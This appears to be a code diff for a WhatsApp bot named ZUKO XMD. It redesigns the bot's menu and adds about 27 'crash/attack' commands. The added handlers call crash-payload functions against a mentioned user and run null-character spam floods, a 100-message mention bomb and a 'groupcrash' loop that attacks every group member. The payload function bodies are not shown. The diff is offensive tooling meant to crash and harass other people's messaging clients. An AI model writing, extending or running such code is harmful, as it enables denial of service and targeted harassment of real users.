-            const userName = m.pushName || 'User';
-            const up = process.uptime();
-            const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;
-            const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+        case 'menu': {
+    const now = moment().tz('Africa/Lagos').format('HH:mm:ss');
+    const date = moment().tz('Africa/Lagos').format('DD/MM/YYYY');
+    const userName = m.pushName || 'User';
+    const up = process.uptime();
+    const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;
+    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+    const totalCmds = 60; // updated count
 
-            const menuText =
-`┏━❮ ⟣ 𝗭 𝗨 𝗞 𝗢  ✕  𝗫 𝗠 𝗗 ⟢ ❯━┓
-┃      𝘤𝘰𝘳𝘦 𝘤𝘰𝘮𝘮𝘢𝘯𝘥 𝘥𝘦𝘤𝘬       ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+    const menuText =
+`╭───⟡ ZUKO XMD ⟡───╮
+│
+│  👤 User    : ${userName}
+│  ⏰ Time    : ${now}
+│  📅 Date    : ${date}
+│  ⏳ Uptime  : ${upStr}
+│  💾 RAM     : ${mem} MB
+│  📦 Plugins : ${totalCmds}
+│
+╰───────────────────╯
 
-▞▞▞ 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 ▞▞▞
-  ➤ User    ⟶ ${userName}
-  ➤ Time    ⟶ ${now} (WAT)
-  ➤ Date    ⟶ ${date}
-  ➤ Uptime  ⟶ ${upStr}
-  ➤ Memory  ⟶ ${mem} MB
+┏━━ ⚙️ CORE ━━┓
+┃ ${prefix}ping
+┃ ${prefix}menu
+┃ ${prefix}sticker
+┃ ${prefix}toimage
+┃ ${prefix}toaudio
+┃ ${prefix}togif
+┃ ${prefix}toptt
+┃ ${prefix}getpp
+┃ ${prefix}setpp
+┃ ${prefix}runtime
+┃ ${prefix}setbotname
+┃ ${prefix}setprefix
+┃ ${prefix}apkdl
+┗━━━━━━━━━━━━━┛
 
-▞▞▞ 𝗖𝗢𝗥𝗘 ▞▞▞
-  ➤ ${prefix}ping
-  ➤ ${prefix}menu
-  ➤ ${prefix}sticker
-  ➤ ${prefix}toimage
-  ➤ ${prefix}toaudio
-  ➤ ${prefix}togif
-  ➤ ${prefix}toptt
-  ➤ ${prefix}getpp @user
-  ➤ ${prefix}setpp
-  ➤ ${prefix}runtime
-  ➤ ${prefix}autoreact on/off
-  ➤ ${prefix}setbotname <name>
-  ➤ ${prefix}setmenuimage
-  ➤ ${prefix}apkdl <app>
-  ➤ ${prefix}setprefix <prefix>
+┏━━ ⬇️ DOWNLOAD ━━┓
+┃ ${prefix}tiktok
+┃ ${prefix}ig
+┃ ${prefix}tw
+┃ ${prefix}snap
+┃ ${prefix}fb
+┃ ${prefix}ytvideo
+┃ ${prefix}play
+┗━━━━━━━━━━━━━━━━┛
 
-▞▞▞ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥𝗦 ▞▞▞
-  ➤ ${prefix}tiktok <url>
-  ➤ ${prefix}ig <url>
-  ➤ ${prefix}tw <url>
-  ➤ ${prefix}snap <url>
-  ➤ ${prefix}fb <url>
-  ➤ ${prefix}ytvideo <url> [quality]
-  ➤ ${prefix}play <song name/url>
+┏━━ 👑 GROUP ADMIN ━━┓
+┃ ${prefix}tagall
+┃ ${prefix}groupinfo
+┃ ${prefix}promote
+┃ ${prefix}demote
+┃ ${prefix}kick
+┃ ${prefix}setgcname
+┃ ${prefix}gcdescription
+┃ ${prefix}resetlink
+┃ ${prefix}welcome
+┃ ${prefix}goodbye
+┃ ${prefix}setwelcome
+┃ ${prefix}setgoodbye
+┗━━━━━━━━━━━━━━━━━━━┛
 
-▞▞▞ 𝗚𝗥𝗢𝗨𝗣 𝗔𝗗𝗠𝗜𝗡 ▞▞▞
-  ➤ ${prefix}tagall <msg>
-  ➤ ${prefix}groupinfo
-  ➤ ${prefix}promote @user
-  ➤ ${prefix}demote @user
-  ➤ ${prefix}kick @user
-  ➤ ${prefix}setgcname <name>
-  ➤ ${prefix}gcdescription <desc>
-  ➤ ${prefix}resetlink
-  ➤ ${prefix}welcome on/off
-  ➤ ${prefix}setwelcome <msg>
-  ➤ ${prefix}goodbye on/off
-  ➤ ${prefix}setgoodbye <msg>
+┏━━ 🛡️ PROTECT ━━┓
+┃ ${prefix}antilink
+┃ ${prefix}antisticker
+┃ ${prefix}antitag
+┃ ${prefix}antiviewonce
+┃ ${prefix}anticall
+┃ ${prefix}antidelete
+┃ ${prefix}antibot
+┗━━━━━━━━━━━━━━━┛
 
-▞▞▞ 𝗣𝗥𝗢𝗧𝗘𝗖𝗧𝗜𝗢𝗡𝗦 ▞▞▞
-  ➤ ${prefix}antilink
-  ➤ ${prefix}antisticker
-  ➤ ${prefix}antitag
-  ➤ ${prefix}antiviewonce
-  ➤ ${prefix}anticall
-  ➤ ${prefix}antidelete
-  ➤ ${prefix}antibot
+┏━━ 💀 CRASH/ATTACK ━━┓
+┃ ${prefix}nah 
+┃ ${prefix}buttonbomb
+┃ ${prefix}invisible 
+┃ ${prefix}delayinv
+┃ ${prefix}bulldog
+┃ ${prefix}jarr
+┃ ${prefix}hardbulldo
+┃ ${prefix}megacrash
+┃ ${prefix}crash      
+┃ ${prefix}kill 
+┃ ${prefix}destroy
+┃ ${prefix}supercrash
+┃ ${prefix}finalkill
+┃ ${prefix}freeze
+┃ ${prefix}spam
+┃ ${prefix}mentionbomb
+┃ ${prefix}groupcrash
+┗━━━━━━━━━━━━━━━━━━━┛
 
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃   💎 ZUKO XMD · 🥷 DEV ZUKO   ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-📰 *Forwarded via ${global.newsletterName || 'ZUKO XMD'}*`;
+┏━━ 🧨 ADVANCED CRASH ━━┓
+┃ ${prefix}blankgc
+┃ ${prefix}galaxy
+┃ ${prefix}paynull
+┃ ${prefix}ioslx
+┃ ${prefix}rpnm
+┃ ${prefix}trashloc
+┃ ${prefix}invitea
+┃ ${prefix}invitei
+┃ ${prefix}pollbomb
+┃ ${prefix}betadelay
+┗━━━━━━━━━━━━━━━━━━━┛
 
-            try {
-                const imagePath = './media/logo.jpg';
-                let imageBuffer = null;
-                if (fs.existsSync(imagePath)) imageBuffer = fs.readFileSync(imagePath);
+     ✦ DEV ZUKO ✦`;
 
-                if (imageBuffer) {
-                    await empire.sendMessage(m.chat, {
-                        image: imageBuffer,
-                        caption: menuText,
-                        contextInfo: newsletterContext({ mentionedJid: [m.sender] })
-                    }, { quoted: m });
-                } else {
-                    await empire.sendMessage(m.chat, {
-                        text: menuText,
-                        contextInfo: newsletterContext()
-                    }, { quoted: m });
-                }
-            } catch (e) {
-                await empire.sendMessage(m.chat, {
-                    text: menuText,
-                    contextInfo: newsletterContext()
-                }, { quoted: m });
-            }
-            break;
+    try {
+        const imagePath = './media/logo.jpg';
+        if (fs.existsSync(imagePath)) {
+            await empire.sendMessage(m.chat, {
+                image: fs.readFileSync(imagePath),
+                caption: menuText,
+                contextInfo: newsletterContext({ mentionedJid: [m.sender] })
+            }, { quoted: m });
+        } else {
+            await empire.sendMessage(m.chat, {
+                text: menuText,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
         }
+    } catch (e) {
+        await empire.sendMessage(m.chat, {
+            text: menuText,
+            contextInfo: newsletterContext()
+        }, { quoted: m });
+    }
+    break;
+}
 
         // ═══════════════════════════════════════════════════
         // SETPREFIX - Change the bot's command prefix
@@ -2348,6 +3077,290 @@ ${adminList}`,
             reply(`✅ *Goodbye message set!*\n\n${text}`);
             break;
         }
+        case 'blankgc': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this.');
+    if (!isAdmin) return reply('❌ You need to be a group admin.');
+    if (!m.isGroup) return reply('❌ Only in groups.');
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📰 Blank GC on ${target}...`);
+    await blankgc(target);
+    await reply(`✅ Blank GC complete.`);
+    break;
+}
+
+case 'galaxy': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`🌌 Galaxy on ${target}...`);
+    await galaxy(target);
+    await reply(`✅ Galaxy complete.`);
+    break;
+}
+
+case 'paynull': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💰 PayNull on ${target}...`);
+    await payNulL(target);
+    await reply(`✅ PayNull complete.`);
+    break;
+}
+
+case 'ioslx': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📱 iOS LX on ${target}...`);
+    await iosLx(target);
+    await reply(`✅ iOS LX complete.`);
+    break;
+}
+
+case 'rpnm': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📞 RPNM on ${target}...`);
+    await rpnm(target);
+    await reply(`✅ RPNM complete.`);
+    break;
+}
+
+case 'trashloc': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`🗑️ TrashLoc on ${target}...`);
+    await TrashLocIOS(target);
+    await reply(`✅ TrashLoc complete.`);
+    break;
+}
+
+case 'invitea': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📨 Invite A on ${target}...`);
+    await InViteAdminA(target);
+    await reply(`✅ Invite A complete.`);
+    break;
+}
+
+case 'invitei': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📨 Invite I on ${target}...`);
+    await InViteAdminI(target);
+    await reply(`✅ Invite I complete.`);
+    break;
+}
+
+case 'pollbomb': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📊 Poll bomb on ${target}...`);
+    await EmpireFcPoll(target);
+    await reply(`✅ Poll bomb complete.`);
+    break;
+}
+
+case 'betadelay': {
+    if (!isCreator || !isAdmin || !m.isGroup) return;
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`❄️ BetaDelay on ${target}...`);
+    await betaDelay(empire, target);
+    await reply(`✅ BetaDelay complete.`);
+    break;
+}
+        
+        case 'nah':
+case 'buttonbomb': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💣 Button bombing ${target}...`);
+    await nah(violet, target);
+    await reply(`✅ Button bomb sent.`);
+    break;
+}
+
+case 'invisible':
+case 'delayinv': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`👻 Invisible attack on ${target}...`);
+    await DelayInvisible(target);
+    await reply(`✅ Invisible attack sent.`);
+    break;
+}
+
+case 'bulldog': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`🐕 Bulldog attacking ${target}...`);
+    await BulldogDog(violet, target);
+    await reply(`✅ Bulldog complete.`);
+    break;
+}
+
+case 'jarr': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`📦 Jarr attack on ${target}...`);
+    await DelayJarr(target);
+    await reply(`✅ Jarr complete.`);
+    break;
+}
+
+case 'hardbulldo': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`🔥 Hard Bulldo on ${target}...`);
+    await DelayHardBulldo(violet, target);
+    await reply(`✅ Hard Bulldo complete.`);
+    break;
+}
+
+case 'megacrash': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💀💀💀 MEGA CRASH on ${target} 💀💀💀`);
+    
+    await Promise.all([
+        nah(violet, target),
+        DelayInvisible(target),
+        BulldogDog(violet, target),
+        DelayJarr(target),
+        DelayHardBulldo(violet, target)
+    ]);
+    
+    await reply(`💀 ${target} has been mega-crashed.`);
+    break;
+}
+
+case 'crash':
+case 'kill':
+case 'destroy': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💀 Destroying ${target}...`);
+    await Promise.all([
+        gsInt(target, true),
+        delay1(target),
+        zXfreeze(target),
+        InvSCrt(violet, target)
+    ]);
+    await reply(`✅ Destruction complete on ${target}`);
+    break;
+}
+
+case 'supercrash': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💀 SUPER CRASH on ${target}...`);
+    await superCombo(target);
+    await reply(`✅ Super crash complete.`);
+    break;
+}
+
+case 'finalkill': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`💀💀💀 FINAL DESTRUCTION on ${target} 💀💀💀`);
+    await finalDestruction(target);
+    await reply(`💀 ${target} has been obliterated.`);
+    break;
+}
+
+case 'freeze': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`❄️ Freezing ${target}...`);
+    await zXfreeze(target);
+    await reply(`❄️ Freeze attack sent.`);
+    break;
+}
+
+case 'spam': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    const count = parseInt(m.args[0]) || 50;
+    await reply(`📨 Spamming ${target} with ${count} messages...`);
+    for (let i = 0; i < count; i++) {
+        await violet.sendMessage(target, {
+            text: `💀 SPAM ${i+1}/${count} ` + "\u0000".repeat(1000)
+        }).catch(() => {});
+        await sleep(50);
+    }
+    await reply(`✅ Spam complete.`);
+    break;
+}
+
+case 'mentionbomb': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    await reply(`🔔 Mention bombing ${target}...`);
+    for (let i = 0; i < 100; i++) {
+        await violet.sendMessage(m.chat, {
+            text: `@${target.split('@')[0]}`,
+            mentions: [target]
+        }).catch(() => {});
+        await sleep(30);
+    }
+    await reply(`✅ Mention bomb complete.`);
+    break;
+}
+
+case 'groupcrash': {
+    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
+    if (!isAdmin) return reply('❌ You need to be a group admin to use this command.');
+    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    
+    await reply(`💀 Crashing entire group...`);
+    const participants = m.groupMetadata?.participants || [];
+    for (const p of participants) {
+        const target = p.id;
+        await Promise.all([
+            gsInt(target, true),
+            delay1(target),
+            zXfreeze(target)
+        ]);
+        await sleep(100);
+    }
+    await reply(`✅ Group crash complete.`);
+    break;
+}
 
         // ═══════════════════════════════════════════════════
         // Add new commands below this line, e.g.:
